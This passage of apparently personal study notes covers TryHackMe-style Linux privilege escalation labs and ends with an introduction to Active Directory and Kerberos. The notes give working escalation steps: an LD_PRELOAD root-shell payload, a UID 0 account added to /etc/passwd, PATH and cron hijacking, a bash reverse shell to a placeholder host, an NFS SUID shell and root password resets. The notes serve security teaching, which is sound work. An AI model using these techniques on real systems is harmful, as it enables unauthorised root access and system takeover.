find / -perm -a=x                   # executable files
find /home -user frank              # all files owned by frank under /home
```

**Time-based:**

```bash
find / -mtime -10       # modified in last 10 days
find / -atime -10       # accessed in last 10 days
find / -cmin -60        # changed in the last 60 minutes
find / -amin -60        # accessed in the last 60 minutes
```

**Size-based:**

```bash
find / -size +50M       # files ≥50MB (+ larger, - smaller)
```

```bash
find / -size +100M
# /john/.ZAP/plugin/ZAP_2.15.0_Linux.tar.gz
```

> [!note] Suppressing find's error noise `find` generates a lot of permission-denied errors when scanning `/` as a non-root user, cluttering the output. Append `2>/dev/null` to redirect errors away and keep the output readable.

**World-writable folders** — three different syntaxes exist for the same underlying result:

```bash
find / -writable -type d 2>/dev/null
find / -perm -222 -type d 2>/dev/null
find / -perm -o w -type d 2>/dev/null
```

> [!note] Why `-perm` has multiple forms Per the `find` manual: `-perm mode` requires an **exact** permission match (rarely what's wanted — `-perm g=w` only matches files where group-write is the _only_ bit set). `-perm -mode` matches files where **all** specified bits are set (the usual intent — `-perm -g=w` matches any file with group write, regardless of other bits). `-perm /mode` matches files where **any** of the specified bits are set. This distinction is exactly why three superficially different commands above all converge on the same practical result — they're using the `-` (all-bits-set) form correctly, just expressed differently.

World-executable folders:

```bash
find / -perm -o x -type d 2>/dev/null
```

**Finding development tools/interpreters** — directly useful for identifying what languages are available for exploitation or payload execution:

```bash
find / -name perl*
find / -name python*
find / -name gcc*
```

**Wildcard searches** when the exact filename is unknown:

```bash
find / -name pass*.txt
# matches: pass.txt, password.txt, passwords.txt, ...
```

**SUID binaries** — critical for privilege escalation, covered in depth in a later room but essential to enumeration now:

```bash
find / -perm -u=s -type f 2>/dev/null
```

SUID lets a file execute with the **privilege level of the file's owner**, not the user running it — a root-owned SUID binary with exploitable functionality is a direct escalation vector.

> [!summary] Quick Recap — File Enumeration
> 
> - `ls -la`, always — dotfiles are genuinely invisible without `-a`, and this alone can hide a credential file in plain sight
> - `2>/dev/null` on any full-filesystem `find` scan keeps output readable by suppressing permission-denied noise
> - `-perm -mode` (all bits set) is almost always the intended form for permission searches — understand why three different-looking commands can return identical world-writable results
> - `find / -perm -u=s -type f` (SUID binaries) is one of the single most important enumeration commands in the entire Linux privesc process — flagged here, exploited in depth later

---

> [!summary] Full Linux Privilege Escalation: Enumeration Room — One Glance
> 
> - Enumeration is the prerequisite for everything else — exploitation without it is guesswork
> - OS enumeration (`uname`, `/proc/version`, `/etc/issue`, `dpkg -l`) feeds kernel/software exploit research; cron entries reveal privileged scheduled tasks worth flagging early
> - User enumeration (`id`, `sudo -l`, `/etc/passwd` filtered by `/home`) surfaces group membership and sudo misconfigurations — often the fastest path to escalation on its own
> - Network enumeration (`ifconfig`/`ip addr`, `netstat`/`ss`) reveals interfaces, listening services, and — running the same commands again after any privilege gain — information hidden from lower-privilege views
> - File enumeration (`ls -la`, `find` with permission/time/size/name filters) is where SUID binaries, world-writable paths, and hidden credential files actually get found — the `-perm -u=s` SUID search is the single highest-value file check in the whole room
> - Every category here maps directly onto the misconfiguration categories from Host-Server Configuration Reviews — this room is that methodology applied hands-on to Linux
### Linux Privilege Escalation: Basics

> [!info] Room context Picks up directly from Linux PrivEsc: Enumeration — now _acting_ on found misconfigurations rather than just spotting them. Six distinct vectors, each on its own target machine: sudo abuse, SUID binaries, PATH hijacking, Linux capabilities, writable cron jobs, and misconfigured NFS shares.

> [!info] Reference tool **GTFOBins** (gtfobins.github.io) — the standard reference for how any binary you have sudo rights to, or that has SUID/capabilities set, can be abused for escalation. Check every enumerated binary against it.

#### Privilege Escalation: Sudo

**The setup:** admins often grant specific sudo rights for operational convenience — e.g. a SOC analyst needing `nmap` with root privileges without full root access. `sudo -l` shows exactly what the current user can run as root.

**Basic sudo escalation:**

```bash
sudo -l
```

```
User labuser may run the following commands on target:
    (ALL) NOPASSWD: /bin/cat
```

Sudo rights on `/bin/cat` alone = read **any** file as root, including `/etc/shadow` for offline hash cracking. GTFOBins is the tool for translating "I have sudo on X" into "here's exactly how to abuse X" for any given binary.

**Leveraging application functions (no direct GTFOBins entry needed)** — some sudo-permitted applications have a legitimate feature abusable for file disclosure. Apache2's `-f` flag (alternate config file) is the room's example:

```bash
sudo apache2 -C "LoadModule mpm_event_module /usr/lib/apache2/modules/mod_mpm_event.so" -f /etc/shadow
```

Loading `/etc/shadow` as a "config file" produces an error message containing the **first line** of the file — the root entry — leaking the root hash for offline cracking, all through a legitimate application flag rather than a known exploit.

**`LD_PRELOAD` abuse** — appears when `sudo -l` output shows `env_keep+=LD_PRELOAD`:

```
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD
User john may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
```

`LD_PRELOAD` lets any program load a specified shared library **before** its own. If `env_keep` preserves it through sudo, a malicious `.so` can be forced to load and execute inside any sudo-permitted binary.

> [!warning] The one hard requirement `LD_PRELOAD` is **ignored** if the real user ID differs from the effective user ID — this technique only works when that condition doesn't apply, which is exactly the scenario `env_keep+=LD_PRELOAD` in `sudo -l` output confirms.

**Steps:**

1. Confirm `LD_PRELOAD` + `env_keep` in `sudo -l`
2. Write a small C payload compiled as a shared object:
    
    ```c
    #include <stdio.h>#include <sys/types.h>#include <stdlib.h>void _init() {unsetenv("LD_PRELOAD");setgid(0);setuid(0);system("/bin/bash");}
    ```
    
3. Compile:
    
    ```bash
    gcc -fPIC -shared -o shell.so shell.c -nostartfiles
    ```
    
4. Run any sudo-permitted binary with `LD_PRELOAD` pointed at it:
    
    ```bash
    sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
    ```
    

Result: root shell, regardless of what the actual sudo-permitted binary (`find`, in this case) even does — the shared object executes on load, before the target program's own logic ever runs.

> [!note] LD_PRELOAD is the rare case Most real sudo misconfigurations are far simpler than this — a direct GTFOBins-documented binary abuse. LD_PRELOAD is worth knowing but shouldn't be the first thing checked.

> [!summary] Quick Recap — Sudo Escalation
> 
> - `sudo -l` is always the first command — check every listed binary against GTFOBins immediately
> - Even binaries with no "known exploit" can leak data through legitimate features (Apache's `-f` flag reading arbitrary files as a "config")
> - `LD_PRELOAD` + `env_keep` in `sudo -l` output = shared-library injection into any sudo-permitted binary, regardless of what that binary actually does
> - `_init()` in a compiled `.so` runs before the target program's own code — this is the exact mechanism LD_PRELOAD abuse exploits

---

#### Privilege Escalation: SUID

**Recap:** SUID (Set-User-ID) lets a binary execute with the **file owner's** privileges, not the executing user's — visible as an `s` in the owner-execute permission bit.

**Finding SUID/SGID binaries:**

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

Cross-reference every result against **GTFOBins' SUID filter** (gtfobins.org/#//^suid$) — most standard system binaries in this list are expected/benign; the interesting finds are unusual entries like a SUID-set `nano` or a custom binary.

> [!note] Real escalation often needs intermediate steps Finding a SUID `nano` isn't itself the escalation — it's the _lever_. The room's point: real-world privesc usually means finding a small, seemingly minor foothold and working out how to leverage it into something bigger, not finding an instant root shell directly.

**With SUID `nano`, two paths:**

**Path 1 — read `/etc/shadow` for offline cracking:**

```bash
nano /etc/shadow    # readable via nano's root-owner privilege
```

Combine with `/etc/passwd` using `unshadow` to produce a crackable file:

```bash
unshadow passwd.txt shadow.txt > passwords.txt
```

Feed to John the Ripper with an appropriate wordlist.

**Path 2 — add a new root-privileged user directly, skipping cracking entirely:**

Generate a password hash:

```bash
openssl passwd -1 -salt THM password1
# $1$THM$WnbwlliCqxFRQepUTCkUT1
```

Edit `/etc/passwd` (via the SUID `nano`) to add a new entry using **UID/GID 0** and pointing at `/bin/bash`:

```
hacker:$1$THM$WnbwlliCqxFRQepUTCkUT1:0:0:root:/root:/bin/bash
```

Switch to the new account:

```bash
su hacker
# root shell
```

> [!note] Why UID/GID 0 is what matters The `/etc/passwd` fields that actually grant root are the third and fourth (UID and GID) — setting both to `0` makes the account root-equivalent regardless of username. The `root:/bin/bash` pattern in the example is exactly that: any username works, `0:0` is what counts.

> [!summary] Quick Recap — SUID Escalation
> 
> - `find / -type f -perm -04000 -ls 2>/dev/null` finds every SUID/SGID binary — cross-reference against GTFOBins' SUID list specifically
> - Two standard paths once a usable SUID editor is found: read `/etc/shadow` for offline cracking, or directly edit `/etc/passwd` to add a UID/GID 0 account — the second skips cracking entirely
> - UID 0 + GID 0 in `/etc/passwd`, not the username itself, is what makes an added account root-equivalent

---

#### Privilege Escalation: PATH

**Mechanism:** `PATH` tells the OS where to search for executables not referenced by absolute path. If a directory in `PATH` is **writable** by the current user, and a privileged (SUID) program calls an executable **by name only** (not full path), a malicious binary of that name planted in the writable directory gets executed instead — inheriting the calling program's privilege level.

**Four questions to answer before attempting this:**

1. What directories are in `$PATH`?
2. Does the current user have write access to any of them?
3. Can `$PATH` itself be modified?
4. Is there a SUID script/binary that calls something by name, vulnerable to this?

**Example vulnerable program** (calls `thm` by name, no full path):

```c
void main()
{ setuid(0);
  setgid(0);
  system("thm");
}
```

Compiled and SUID-set:

```bash
gcc path_exp.c -o program -w
chmod u+s program
```

**Finding writable directories:**

```bash
find / -type d -writable 2> /dev/null | sort -u
```

`/tmp` is typically the easiest writable target. Since `/tmp` usually isn't already in `PATH`, add it:

```bash
export PATH=/tmp:$PATH
```

**Plant the malicious `thm`:**

```bash
cd /tmp
echo "/bin/bash" > thm
chmod 777 thm
```

**Trigger:**

```bash
./program
# root shell — program's SUID privilege carries into the substituted "thm"
```

> [!note] The core exploitable pattern Any SUID/privileged binary calling `system()` or similar with a **bare command name** (not `/usr/bin/thm`, just `thm`) is trusting `PATH` resolution — and `PATH` resolution trusts whatever comes first in the search order, including a newly-prepended writable directory.

> [!summary] Quick Recap — PATH Hijacking
> 
> - Requires: a writable directory in (or addable to) `$PATH`, plus a privileged program calling something by bare name rather than full path
> - `export PATH=/tmp:$PATH` prepends `/tmp` so it's searched **first** — the malicious binary wins the resolution race
> - `find / -type d -writable 2>/dev/null` is the direct enumeration step for candidate injection directories
> - The root cause is always the same: a privileged process trusting unqualified command names instead of absolute paths

---

#### Privilege Escalation: Capability

**What capabilities are:** a more granular privilege mechanism than SUID — grants a binary _specific_ elevated abilities (e.g. binding to a network socket) without full root. Lets admins avoid an all-or-nothing SUID/sudo grant for a narrow operational need.

**Enumeration:**

```bash
getcap -r / 2>/dev/null
```

```
/home/john/vim = cap_setuid+ep
```

`cap_setuid+ep` specifically means the binary can change its user ID to **any** user, including root, **immediately active on execution** (`ep` = effective + permitted).

> [!warning] Capabilities are invisible to SUID enumeration Neither Vim nor a copy of it needs the SUID bit set for this to work — `ls -l` shows completely ordinary permissions. This vector is **only** discoverable via `getcap`, not via any SUID-focused search. Always run both checks independently; one won't surface the other's findings.

**Exploitation** — GTFOBins has a dedicated capabilities-filtered list (gtfobins.org/#//^capabilities$). Vim's entry uses its embedded Python support:

```bash
./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

- Imports Python's `os` module (accessible because Vim was compiled with Python support)
- `os.setuid(0)` — sets UID to root; **without this line, the subsequent shell call runs at the original UID**, since the capability alone doesn't automatically apply to child processes
- `os.execl(...)` — replaces the current process with a root-privileged shell

> [!summary] Quick Recap — Capability Escalation
> 
> - `getcap -r / 2>/dev/null` — the dedicated enumeration command; completely separate from SUID checks and finds a different class of vulnerable binary
> - `cap_setuid+ep` specifically means "can become any user, immediately, on execution" — the most directly exploitable capability
> - `setuid(0)` must be called explicitly within the exploit payload — the capability grants the _ability_ to escalate, not automatic escalation
> - Always run `getcap` and the SUID `find` command independently — they surface entirely different, non-overlapping findings

---

#### Privilege Escalation: Cron Jobs

**Recap from Enumeration:** cron jobs run with their **owner's** privileges, not the invoking user's. A root-owned cron job referencing a script the current user can modify is a direct escalation vector.

**System-wide cron table:** `/etc/crontab`, world-readable:

```bash
cat /etc/crontab
```

```
* * * * * root /home/john/Desktop/backup.sh
```

Runs every minute, as root. If `backup.sh` is writable by the current user:

```bash
ls -la backup.sh
# -rwxrwxrwx 1 root root 142 Apr 28 14:23 backup.sh
```

**Rewrite it to a reverse shell:**

```bash
cat backup.sh
#!/bin/bash
bash -i >& /dev/tcp/CONNECTION_IP/6666 0>&1
```

Listener on the attacking machine:

```bash
nc -nlvp 6666
```

Within a minute, the cron job fires the modified script — connection arrives with `uid=0(root)`.

> [!note] Two practical reminders Reverse shell syntax varies by available tooling (`nc -e` isn't universal — see the Shells & Listeners room for alternatives). And always **prefer reverse shells over destructive actions** during a real engagement — this is exactly the controlled-exploitation discipline from the Exploitation and Weaponisation room applied here.

**A second, subtler pattern — orphaned cron entries:**

```
* * * * * root antivirus.sh
```

`locate antivirus.sh` returns nothing — the referenced script **doesn't exist on disk anymore**, but the cron entry survived its removal (a common real-world admin oversight: a script gets deleted but the scheduling entry doesn't).

**Because the script path is unqualified**, cron resolves it via the `PATH` variable defined **within `/etc/crontab` itself**:

```
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
```

If any directory in that specific `PATH` line is writable (in this example, `/home/user`), planting a file named `antivirus.sh` there gets it picked up and executed by cron **as root**, exactly like the direct writable-script case above.

**Alternative payload — directly changing the root password:**

```bash
echo "root:newpass" | chpasswd
```

Then simply `su` with the new password after the cron job fires — no reverse shell needed at all.

> [!note] Wildcard-processing tools are worth remembering here too If an existing cron script uses `tar`, `7z`, `rsync`, etc. with a wildcard, the wildcard-injection technique from the Host-Server Configuration Reviews room applies directly — always worth checking a discovered script's actual command usage, not just its file permissions.

**Cron locations beyond `/etc/crontab`, worth checking every time:**

|Location|Behaviour|
|---|---|
|`/etc/cron.d/`|Drop-in crontab fragments, package-installed, same format as `/etc/crontab`|
|`/etc/cron.hourly/`|Scripts run once per hour|
|`/etc/cron.daily/`|Scripts run once per day|
|`/etc/cron.weekly/`|Scripts run once per week|
|`/etc/cron.monthly/`|Scripts run once per month|
|`/var/spool/cron/crontabs/` (Debian/Ubuntu)|Per-user personal crontabs, filename = username|

> [!summary] Quick Recap — Cron Job Escalation
> 
> - Any writable script referenced by a root cron job = rewrite to a reverse shell (or a direct password-change payload) and wait
> - Orphaned cron entries (script deleted, entry left behind) are exploitable by planting a same-named script in a writable `PATH` directory listed in `/etc/crontab` itself
> - `chpasswd` payload skips the reverse-shell/listener step entirely — sometimes simpler when only credential-based access is needed
> - Cron entries live in six+ distinct locations beyond `/etc/crontab` — check all of them, not just the obvious one

---

#### Privilege Escalation: NFS

**Beyond local misconfigurations** — shared folders and remote management interfaces (SSH, Telnet, NFS) are equally valid escalation vectors, sometimes requiring combining vectors (e.g. finding a root SSH key and connecting directly as root rather than escalating locally at all).

**NFS config:** `/etc/exports`, typically world-readable:

```bash
cat /etc/exports
```

```
/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
/backups *(rw,sync,insecure,no_root_squash,no_subtree_check)
```

**The critical flag: `no_root_squash`.** By default, NFS remaps root on the client to `nfsnobody`, stripping root privilege from anything written to the share. `no_root_squash` **disables that remapping** — meaning a file created as root on the attacker's machine and written to the share **retains root ownership** on the target.

**From the attacking machine — enumerate exported shares:**

```bash
showmount -e MACHINE_IP
```

```
/backups          *
/mnt/sharedfolder *
/tmp              *
```

**Mount a `no_root_squash` share locally:**

```bash
mkdir /tmp/backupsonattackermachine
mount -o rw MACHINE_IP:/backups /tmp/backupsonattackermachine
cd /tmp/backupsonattackermachine
```

**Build a SUID root shell directly on the mounted share** (as root on the attacker's own machine, since that's what actually matters for `no_root_squash`):

```c
int main() {
setgid(0);
setuid(0);
system("/bin/bash");
return 0;
}
```

```bash
gcc nfs.c -o nfs -w -static
chmod +s nfs
```

> [!warning] File ownership must be root:root Because the file was created as root on the attacking machine while mounted against a `no_root_squash` share, it lands on the target **already owned by root** — this is the entire point of the misconfiguration. Verify ownership explicitly rather than assuming.

**On the target** — the file (and its SUID bit) is already present via the shared mount, no transfer needed:

```bash
cd /backups
ls -l
# -rwsr-sr-x 1 root root 16712 Jun 17 16:24 nfs
./nfs
# root shell
```

> [!summary] Quick Recap — NFS Escalation
> 
> - `no_root_squash` on a writable share is the entire vulnerability — it lets files created as root on the attacker's machine retain root ownership on the target
> - `showmount -e <target>` enumerates exported shares remotely, before ever touching the target directly
> - The exploit binary is built and SUID-set **on the attacker's own machine** while mounted — root ownership transfers automatically because of the misconfiguration, no separate privilege needed on the target side
> - Once mounted, no file transfer step is needed — the SUID binary is already present on the target through the shared mount itself

---

> [!summary] Full Linux Privilege Escalation: Basics Room — One Glance
> 
> - **Sudo**: `sudo -l` + GTFOBins first; legitimate app features (Apache `-f`) and `LD_PRELOAD`+`env_keep` are less obvious but real escalation paths
> - **SUID**: `find / -perm -04000` + GTFOBins' SUID filter; read `/etc/shadow` for cracking, or directly edit `/etc/passwd` with UID/GID 0 for instant root
> - **PATH**: writable `PATH` directory + a privileged program calling a bare (non-absolute) command name = binary substitution
> - **Capabilities**: `getcap -r /` is a _separate_ enumeration step from SUID checks — `cap_setuid+ep` is the most directly exploitable capability, requires explicit `setuid(0)` in the payload
> - **Cron**: writable scripts referenced by root cron jobs, or orphaned entries exploitable via a writable `PATH` directory defined inside `/etc/crontab` itself
> - **NFS**: `no_root_squash` on a writable, mountable share lets root-owned/SUID files created on the attacker's machine land on the target already root-owned — build and set SUID locally, execute on target
> - Common thread across every vector: enumeration (from the previous room) identifies the opportunity, but recognising _how_ the specific misconfiguration translates into an actual escalation path is the real skill this room builds
### Linux Privilege Escalation: Automation

> [!info] Room context Builds on Enumeration and Basics — expands the toolkit with automation for enumeration speed, a structured methodology for using public exploits, and `pspy` for catching short-lived privileged processes that static enumeration snapshots miss entirely.

#### Automated Enumeration Tools

**Purpose and limits:** these tools save time — they do **not** replace understanding. Every one may miss vectors a manual pass would catch, and target environment availability (installed interpreters, etc.) dictates which tools can even run. Knowing several rather than relying on one favourite is the practical stance.

|Tool|What It Does|
|---|---|
|**LinPEAS**|Automated script highlighting privesc paths across the system — misconfigs, weak permissions, credentials, and more|
|**LinEnum**|Scripted local enumeration — system info, users, crons, SUID binaries, in a readable report|
|**LES (Linux Exploit Suggester)**|Matches kernel version against known CVEs, suggests applicable local privesc exploits|
|**Linux Smart Enumeration**|Adjustable verbosity levels — starts quiet, reveals progressively more detail as the level increases|
|**Linux Priv Checker**|Enumerates system info, automatically flags common privesc opportunities inline|

> [!summary] Quick Recap — Automated Tools
> 
> - Tools save time, not judgement — every one can miss vectors a manual enumeration pass (from the earlier rooms) would catch
> - Target environment (installed interpreters/runtimes) dictates tool availability — know multiple options, not just one go-to
> - LES specifically maps to kernel CVEs — a direct bridge into the next section's public-exploit workflow

---

#### Privilege Escalation: Public Exploits

**The distinction from everything in the Basics room:** misconfiguration-based escalation exploits software working _exactly as designed_, just poorly configured. **Public exploits exploit the software itself being broken** — a bug (buffer overflow, race condition, logic error) doing something the developers never intended. These get assigned **CVE identifiers**, often with working exploit code published publicly.

**Methodology — skipping steps here is how machines get crashed or hours get wasted on exploits that were never going to work:**

1. **Enumerate** — installed software, versions, kernel version, distro version, SUID binaries, root-running services (the Enumeration room's skillset directly)
2. **Research** — is there a CVE for that version? A public exploit? Does it match target architecture/distro?
3. **Evaluate** — read the actual exploit code before running it. Does it need `gcc` on target? Kernel-version-specific? **Could it crash the system?**
4. **Exploit** — transfer, compile if needed, run
5. **Verify** — `whoami`, `id`, confirm access to something previously inaccessible

> [!warning] Evaluation is not optional Running unread exploit code against a live target is how services crash and engagements go sideways. Understanding what the code actually does — its requirements, its failure modes, its blast radius — comes before execution, every time.

**Where to find public exploits:**

- **`searchsploit`** — CLI tool searching a local, offline copy of Exploit-DB, pre-installed on Kali:
    
    ```bash
    searchsploit <software> <version>
    ```
    
- **GitHub** — search `CVE-<id> github` once a specific CVE is identified
- **Enumeration tools themselves** — LinPEAS and similar don't just flag misconfigs, they check for known CVEs too, often surfacing the CVE number directly as a research starting point

**Kernel exploits** — the kernel is the most privileged software on the system; a kernel vulnerability can jump straight from unprivileged to root regardless of how well everything _else_ is configured.

```bash
uname -r
uname -a
cat /etc/os-release
```

Then research the exact kernel version against `searchsploit`/Google for known exploits.

**Non-kernel public exploits** — many privesc CVEs live in userland software (utilities/programs running with elevated privileges) rather than the kernel. Often **easier to exploit and less likely to crash the system** than kernel exploits — worth checking before reaching for kernel-level options.

**Practical delivery pattern:** find exploit on GitHub → download to AttackBox → transfer to target via `scp`:

```bash
scp <file> john@MACHINE_IP:/home/john/
```

> [!summary] Quick Recap — Public Exploits
> 
> - Misconfiguration escalation = software working as designed but poorly set up; public exploits = the software itself is broken (a real bug, CVE-tracked)
> - Five-step methodology: enumerate → research → **evaluate (read the code first)** → exploit → verify — evaluation is the step most likely to get skipped and most likely to cause real damage if it is
> - `searchsploit` (offline, Kali-native) and `CVE-<id> github` searches are the two primary discovery paths
> - Userland/non-kernel CVEs are often easier and safer to exploit than kernel exploits — don't default to kernel-level options first

---

#### `pspy` — Unprivileged Process Monitoring

**The gap it fills:** automated enumeration tools (LinPEAS, etc.) capture only a **static snapshot** at run time — they can't see short-lived processes (cron jobs, scheduled scripts) that execute and exit in milliseconds. **`pspy` observes processes, cron jobs, and other users' commands in real time, without requiring root.**

**Why polling fails here:** on Linux, low-privileged users normally see only their own processes via `/proc`. Short-lived tasks can exit before a polling-based tool ever samples the process table — traditional "check `/proc` periodically" approaches simply miss them.

**How `pspy` actually works — event-driven, not polling:**

1. Sets **inotify watches** on commonly-accessed directories (`/etc`, `/tmp`, `/usr`, `/var`)
2. On detected filesystem activity, immediately scans `/proc` to identify the new process
3. Captures UID, PID, timestamp, and full command — **even for processes run by other users**

> [!note] This isn't a permission bypass Process metadata in `/proc` is briefly visible to unprivileged users during a process's actual lifetime — `pspy` doesn't circumvent any kernel permission boundary, it simply **reacts fast enough** (via filesystem event triggers rather than a polling loop) to catch metadata that would otherwise disappear before a slower tool ever looked.

**Usage:**

```bash
./pspy64
```

Output shows every process system-wide, including root-owned ones invisible to normal enumeration:

```
2026/02/10 06:40:16 CMD: UID=0     PID=1937   | /bin/bash /root/run-backup.sh
2026/02/10 06:40:16 CMD: UID=0     PID=1942   | /bin/bash /root/run-rm-tmp.sh
2026/02/10 06:40:16 CMD: UID=0     PID=1943   | /bin/bash /usr/local/bin/rm-tmp.sh
```

**Following up on a discovered root-owned script:**

```bash
ls -la /usr/local/bin/rm-tmp.sh
# -rwxrwxrwx 1 root root 57 Jan 20 10:27 /usr/local/bin/rm-tmp.sh

cat /usr/local/bin/rm-tmp.sh
#!/bin/bash
rm -r /tmp/*
```

World-writable, runs in a loop as root — the exact same writable-script-triggered-by-privileged-process pattern from the Cron Jobs section in Basics, except `pspy` is what _found_ it, since it's not sitting in a static crontab anyone could just `cat`.

**Exploitation** — append a privilege-escalating payload:

```bash
#!/bin/bash
rm -r /tmp/*
echo "root:newpass" | chpasswd
```

Once the loop re-executes the script:

```bash
su
# Password: (newpass)
root@privesc:/home/john#
```

> [!summary] Quick Recap — pspy
> 
> - Fills the exact gap static tools (LinPEAS/LinEnum/etc.) leave: short-lived processes that execute and exit before a snapshot-based scan ever samples them
> - Event-driven via inotify watches on common directories, not polling — reacts to filesystem activity instead of periodically re-checking `/proc`
> - Doesn't bypass any permission boundary — it exploits the brief window where `/proc` metadata is genuinely visible to unprivileged users during a process's real lifetime
> - Frequently surfaces the _same class_ of exploitable writable-script-triggered-by-cron pattern as manual crontab enumeration — but for processes with no static, readable schedule entry to find manually in the first place

---

> [!summary] Full Linux Privilege Escalation: Automation Room — One Glance
> 
> - Automated enumeration tools (LinPEAS, LinEnum, LES, Linux Smart Enumeration, Linux Priv Checker) save time but don't replace manual understanding — environment availability dictates which tool even runs
> - Public exploits target broken software (CVE-tracked bugs), distinct from the Basics room's misconfiguration-based vectors — five-step methodology (enumerate → research → **evaluate** → exploit → verify), with evaluation being the step most often skipped and most consequential to skip
> - `searchsploit` (offline) and `CVE-<id> github` are the two primary exploit-discovery paths; non-kernel/userland CVEs are frequently easier and lower-risk than kernel exploits
> - `pspy` closes the real gap static tools can't: event-driven (inotify-based) real-time process observation catches short-lived, privileged processes invisible to any snapshot-based enumeration — often revealing the same exploitable patterns as manual enumeration, just for processes with no static config file to have found manually in the first place

## 15. Active Directory Security Testing Basics
### Active Directory Basics

> [!info] Room context Hands-on role-play as the new IT admin at THM Inc. — building out a real multi-domain Active Directory forest from scratch: creating a child domain, joining a server to it, managing users/computers/GPOs, and establishing cross-forest trust with a partner company (TryVendorMe). Network subnet: `192.168.10.0/24`.

#### Windows Domains

**The scaling problem a domain solves:** managing 5 computers/5 users individually (manual per-machine config, on-site support) works fine at tiny scale. At 157 computers / 320 users across four offices, that approach collapses entirely.

**A Windows domain** = a group of users and computers under centralised administration, with all identity/policy data stored in a single repository: **Active Directory (AD)**. The server running AD services is the **Domain Controller (DC)**.

**Core advantages:**

- **Centralised identity management** — all users configured from one place
- **Centralised security policy** — configured once in AD, applied network-wide

**The familiar real-world pattern:** a school/university login that works on _any_ campus machine — because authentication is forwarded back to AD for verification rather than checked against credentials stored locally on each machine. The same mechanism is what lets an institution restrict control panel access campus-wide via centrally deployed policy.

> [!summary] Quick Recap — Windows Domains
> 
> - A domain centralises identity + policy management that doesn't scale as separate per-machine configuration
> - AD is the repository; the Domain Controller is the server running the AD service
> - The "same login works everywhere on campus" experience is literally AD authentication being forwarded back to a central DC

---

#### Active Directory Domain Service (AD DS)

**Core concept:** AD DS is a catalogue of every "object" on the network — users, groups, machines, printers, shares, and more.

**Users** — one of the most common object types, and a **security principal** (an object that can be authenticated and assigned privileges over resources). Represents two kinds of entities:

- **People** — individual employees needing network access
- **Services** — e.g. IIS, MSSQL; every service needs a user to run as, but service accounts carry only the privileges that specific service requires

**Machines** — every domain-joined computer gets a machine object, also a security principal with its own account. **Naming convention: computer name + `$`** (e.g. `ROOTDC` → `ROOTDC$`).

> [!note] Machine accounts are local admins with auto-rotated passwords Machine accounts are local administrators on their assigned computer and aren't meant to be used by anyone but the computer itself — but like any account, the password (if known) works for login. Passwords auto-rotate and are typically **120 random characters**, making them impractical to use even if somehow obtained.

**Security Groups** — also security principals, used to grant resource access to many users at once rather than individually. Groups can contain users, machines, and **other groups**.

**Key default security groups:**

|Group|Privileges|
|---|---|
|**Domain Admins**|Administrative privileges over the **entire domain**, including DCs|
|**Server Operators**|Can administer DCs, but **cannot** change admin group memberships|
|**Backup Operators**|Access any file regardless of permissions (for backup purposes)|
|**Account Operators**|Create/modify other domain accounts|
|**Domain Users**|All existing user accounts|
|**Domain Computers**|All existing computers|
|**Domain Controllers**|All existing DCs|

**Managing objects — Active Directory Users and Computers** (ADUC), launched from the DC's Start menu. Shows the OU hierarchy, lets you create/delete/modify users, reset passwords, etc.

**Organizational Units (OUs)** — container objects classifying users/machines for policy application purposes. **A user belongs to exactly one OU at a time.** OU structure typically mirrors business structure (IT, Sales, Marketing, etc.) so baseline policies deploy efficiently per department — though OUs can technically be structured arbitrarily.

**Default containers beyond custom OUs:**

|Container|Purpose|
|---|---|
|`Builtin`|Default groups available to any Windows host|
|`Computers`|Default landing spot for newly domain-joined machines|
|`Domain Controllers`|Default OU for DCs|
|`Users`|Default domain-wide users/groups|
|`Managed Service Accounts`|Service account storage|

**Security Groups vs. OUs — the critical distinction:**

- **OUs** — apply **policies** (config baselines). A user is in exactly one OU — applying two conflicting policy sets to one user wouldn't make sense
- **Security Groups** — grant **permissions** over resources (file shares, printers). A user can belong to **many** groups simultaneously, since access needs stack

> [!summary] Quick Recap — AD DS
> 
> - Users and machines are both "security principals" — can be authenticated and granted privileges
> - Machine accounts follow `COMPUTERNAME$` naming, are local admins, with 120-char auto-rotated passwords
> - OUs = policy application, one per user at a time; Security Groups = resource permission grants, many per user
> - Domain Admins (whole domain) vs. Server Operators (DC admin, no group-membership changes) is a meaningful privilege distinction worth remembering precisely

---

#### Authentication Methods

Two protocols handle network authentication in Windows domains — **Kerberos** (default, modern) and **NetNTLM** (legacy, kept for compatibility, considered obsolete but usually still enabled alongside Kerberos).

#### Kerberos Authentication

**Ticket-based** — a ticket is proof of prior authentication, presented to prove the holder already authenticated to the network.

**Flow:**

1. User sends username + a timestamp encrypted with a key derived from their password to the **KDC** (Key Distribution Center, usually on the DC)
2. KDC returns a **TGT (Ticket Granting Ticket)** + a **Session Key**. The TGT is encrypted with the `krbtgt` account's password hash — the user can't read its contents, but it **internally contains a copy of the Session Key**, so the KDC never needs to separately store the Session Key — it can always recover it by decrypting the TGT
3. To access a specific service, the user presents the TGT + an **SPN** (Service Principal Name) to request a **TGS (Ticket Granting Service)** ticket — sending username + timestamp encrypted with the Session Key
4. KDC returns the TGS + a **Service Session Key**. The TGS is encrypted using a key derived from the **Service Owner's** password hash (the account the target service runs as) — so only that service owner can decrypt it and recover the Service Session Key
5. The TGS is presented directly to the target service, which decrypts it using its own account's password hash to validate the Service Session Key and establish the connection

> [!note] Why the "ticket to get more tickets" design exists The TGT lets a user request as many service tickets (TGS) as needed **without re-entering credentials each time** — authenticate once with the KDC, then use the TGT repeatedly for different services throughout the session.

#### NetNTLM Authentication

**Challenge-response mechanism, never transmits the password or hash over the network:**

1. Client sends an auth request to the server
2. Server generates a random challenge, sends it to the client
3. Client combines its NTLM password hash with the challenge (+ other known data) to compute a response, sends it back
4. Server forwards the challenge + response to the DC for verification
5. DC independently recalculates the expected response using the challenge and compares — match = authenticated, sent back to the server
6. Server relays the result to the client

> [!note] Local accounts skip the DC entirely This full flow applies to **domain** accounts. For a **local** account, the server verifies the challenge-response itself (it already holds the password hash locally in its SAM) — no DC round-trip needed.

> [!summary] Quick Recap — Authentication Methods
> 
> - Kerberos: TGT (proves prior KDC authentication) → TGS (service-specific, requested using the TGT) → presented to the actual service — credentials entered only once per session
